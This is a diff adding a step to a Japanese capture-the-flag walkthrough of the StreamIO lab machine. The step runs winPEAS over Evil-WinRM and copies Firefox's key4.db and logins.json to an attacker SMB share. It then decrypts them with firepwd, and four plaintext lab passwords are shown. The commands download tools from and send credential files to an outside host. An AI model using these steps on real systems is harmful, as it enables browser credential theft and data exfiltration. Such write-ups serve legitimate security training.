@@ -946,3 +946,245 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\nikk37\Documents> cat ../desktop/user.txt
 af990b51d8f6b1007dc48f06192c904e
 ```
+
+
+## STEP 8
+winpeasを配送
+```sh
+└─$ cp /usr/share/peass/winpeas/winPEASx64.exe .
+
+└─$ python3.13 -m http.server 80                                                                                            
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+ブラウザ情報を確認すると、firefoxのdbファイルを発見  
+key4.dbには、firefoxに保存されたクレデンシャルがあるらしい
+```powershell
+*Evil-WinRM* PS C:\Users\nikk37\Documents> powershell /c "invoke-webrequest http://10.10.16.9/winPEASx64.exe -outfile winPEASx64.exe"
+
+*Evil-WinRM* PS C:\Users\nikk37\Documents> .\winPEASx64.exe browserinfo quiet
+ [!] If you want to run the file analysis checks (search sensitive information in files), you need to specify the 'fileanalysis' or 'all' argument. Note that this search might take several minutes. For help, run winpeass.exe --help                                                                                                       
+ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
+Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
+  WinPEAS-ng by @hacktricks_live
+
+       /---------------------------------------------------------------------------------\                                                                             
+       |                             Do you like PEASS?                                  |                                                                             
+       |---------------------------------------------------------------------------------|                                                                             
+       |         Learn Cloud Hacking       :     training.hacktricks.xyz                 |                                                                             
+       |         Follow on Twitter         :     @hacktricks_live                        |                                                                             
+       |         Respect on HTB            :     SirBroccoli                             |                                                                             
+       |---------------------------------------------------------------------------------|                                                                             
+       |                                 Thank you!                                      |                                                                             
+       \---------------------------------------------------------------------------------/                                                                             
+                                                                                                                                                                       
+  [+] Legend:
+         Red                Indicates a special privilege over an object or something is misconfigured
+         Green              Indicates that some protection is enabled or something is well configured
+         Cyan               Indicates active users
+         Blue               Indicates disabled users
+         LightYellow        Indicates links
+
+ You can find a Windows local PE Checklist here: https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html
+   Creating Dynamic lists, this could take a while, please wait...                                                                                                     
+   - Loading sensitive_files yaml definitions file...
+   - Loading regexes yaml definitions file...
+   - Checking if domain...
+   - Getting Win32_UserAccount info...
+Error while getting Win32_UserAccount info: System.Management.ManagementException: Access denied
+   at System.Management.ThreadDispatch.Start()                                                                                                                         
+   at System.Management.ManagementScope.Initialize()                                                                                                                   
+   at System.Management.ManagementObjectSearcher.Initialize()                                                                                                          
+   at System.Management.ManagementObjectSearcher.Get()                                                                                                                 
+   at winPEAS.Checks.Checks.CreateDynamicLists(Boolean isFileSearchEnabled)                                                                                            
+   - Creating current user groups list...
+   - Creating active users list (local only)...
+  [X] Exception: Object reference not set to an instance of an object.
+   - Creating disabled users list...
+  [X] Exception: Object reference not set to an instance of an object.
+   - Admin users list...
+  [X] Exception: Object reference not set to an instance of an object.
+   - Creating AppLocker bypass list...
+   - Creating files/directories list for search...
+        [skipped, file search is disabled]
+
+
+ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Browsers Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Firefox
+    Info: if no credentials were listed, you might need to close the browser and try again.
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Firefox DBs
+È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
+    Firefox credentials file exists at C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db
+È Run SharpWeb (https://github.com/djhohnstein/SharpWeb)
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in Firefox history
+È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
+
+    [x] IO exception, places.sqlite file likely in use (i.e. Firefox is likely running).
+
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Firefox history -- limit 50
+                                                                                                                                                                       
+    https://support.mozilla.org
+    https://www.mozilla.org
+    https://www.mozilla.org/privacy/firefox/gro.allizom.www
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Chrome
+    Info: if no credentials were listed, you might need to close the browser and try again.
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Chrome DBs
+È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in Chrome history
+È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Chrome bookmarks
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Opera
+    Info: if no credentials were listed, you might need to close the browser and try again.
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Brave Browser
+    Info: if no credentials were listed, you might need to close the browser and try again.
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Internet Explorer (unsupported)
+    Info: if no credentials were listed, you might need to close the browser and try again.
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Current IE tabs
+È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
+  [X] Exception: System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---> System.Runtime.InteropServices.COMException: The server process could not be started because the configured identity is incorrect. Check the username and password. (Exception from HRESULT: 0x8000401A)         
+   --- End of inner exception stack trace ---                                                                                                                          
+   at System.RuntimeType.InvokeDispMethod(String name, BindingFlags invokeAttr, Object target, Object[] args, Boolean[] byrefModifiers, Int32 culture, String[] namedParameters)                                                                                                                                                              
+   at System.RuntimeType.InvokeMember(String name, BindingFlags bindingFlags, Binder binder, Object target, Object[] providedArgs, ParameterModifier[] modifiers, CultureInfo culture, String[] namedParams)                                                                                                                                  
+   at winPEAS.KnownFileCreds.Browsers.InternetExplorer.GetCurrentIETabs()                                                                                              
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in IE history
+È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
+
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ IE history -- limit 50
+                                                                                                                                                                       
+    http://go.microsoft.com/fwlink/p/?LinkId=255141
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ IE favorites
+    Not Found
+
+       /---------------------------------------------------------------------------------\                                                                             
+       |                             Do you like PEASS?                                  |                                                                             
+       |---------------------------------------------------------------------------------|                                                                             
+       |         Learn Cloud Hacking       :     training.hacktricks.xyz                 |                                                                             
+       |         Follow on Twitter         :     @hacktricks_live                        |                                                                             
+       |         Respect on HTB            :     SirBroccoli                             |                                                                             
+       |---------------------------------------------------------------------------------|                                                                             
+       |                                 Thank you!                                      |                                                                             
+       \---------------------------------------------------------------------------------/
+```
+ファイル転送のため、kaliにsmbサーバをたてる
+```sh
+└─$ impacket-smbserver -smb2support share .                                                                                                   
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+```
+winpeasでみつけたdbファイルとほかに、クレデンシャルダンプに必要なjsonファイルを配送
+```powershell
+*Evil-WinRM* PS C:\Users\nikk37\Documents> copy C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db \\10.10.16.9\share
+
+*Evil-WinRM* PS C:\Users\nikk37\Documents> copy C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\logins.json \\10.10.16.9\share
+```
+ここでツールをダウンロード
+```sh
+└─$ cd firepwd
+
+└─$ git clone https://github.com/lclevy/firepwd.git       
+Cloning into 'firepwd'...
+remote: Enumerating objects: 88, done.
+remote: Counting objects: 100% (8/8), done.
+remote: Compressing objects: 100% (8/8), done.
+remote: Total 88 (delta 2), reused 3 (delta 0), pack-reused 80 (from 1)
+Receiving objects: 100% (88/88), 239.08 KiB | 4.98 MiB/s, done.
+Resolving deltas: 100% (41/41), done.
+
+└─$ uv init -p 3.13       
+Initialized project `firepwd`
+
+└─$ uv add -r requirements.txt 
+Using CPython 3.13.7 interpreter at: /usr/bin/python3.13
+Creating virtual environment at: .venv
+Resolved 3 packages in 147ms
+Prepared 1 package in 517ms
+Installed 2 packages in 7ms
+ + pyasn1==0.6.1
+ + pycryptodome==3.23.0
+```
+クレデンシャルダンプ  
+４つのクレデンシャルを確認した
+```sh
+└─$ ls firefox 
+key4.db  logins.json
+
+└─$ uv run firepwd.py -d firefox 
+globalSalt: b'd215c391179edb56af928a06c627906bcbd4bd47'
+ SEQUENCE {
+   SEQUENCE {
+     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
+     SEQUENCE {
+       SEQUENCE {
+         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
+         SEQUENCE {
+           OCTETSTRING b'5d573772912b3c198b1e3ee43ccb0f03b0b23e46d51c34a2a055e00ebcd240f5'
+           INTEGER b'01'
+           INTEGER b'20'
+           SEQUENCE {
+             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
+           }
+         }
+       }
+       SEQUENCE {
+         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
+         OCTETSTRING b'1baafcd931194d48f8ba5775a41f'
+       }
+     }
+   }
+   OCTETSTRING b'12e56d1c8458235a4136b280bd7ef9cf'
+ }
+clearText b'70617373776f72642d636865636b0202'
+password check? True
+ SEQUENCE {
+   SEQUENCE {
+     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
+     SEQUENCE {
+       SEQUENCE {
+         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
+         SEQUENCE {
+           OCTETSTRING b'098560d3a6f59f76cb8aad8b3bc7c43d84799b55297a47c53d58b74f41e5967e'
+           INTEGER b'01'
+           INTEGER b'20'
+           SEQUENCE {
+             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
+           }
+         }
+       }
+       SEQUENCE {
+         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
+         OCTETSTRING b'e28a1fe8bcea476e94d3a722dd96'
+       }
+     }
+   }
+   OCTETSTRING b'51ba44cdd139e4d2b25f8d94075ce3aa4a3d516c2e37be634d5e50f6d2f47266'
+ }
+clearText b'b3610ee6e057c4341fc76bc84cc8f7cd51abfe641a3eec9d0808080808080808'
+decrypting login/password pairs
+https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
+https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
+https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
+https://slack.streamio.htb:b'JDgodd',b'password@12'
+```
